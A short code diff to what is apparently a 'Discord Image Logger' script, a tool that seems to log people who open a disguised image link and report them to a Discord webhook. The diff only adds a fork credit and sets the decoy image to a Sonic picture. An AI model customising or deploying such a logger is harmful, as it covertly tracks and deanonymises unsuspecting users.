@@ -1,5 +1,6 @@
 # Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
+# Forked by Hayshemi | https://github.com/hayshemi https://hayshemi.dev
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -13,8 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "image": "https://static.wikia.nocookie.net/sonic-battle/images/4/42/Sonic_Battle_-_Sonic.png",
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
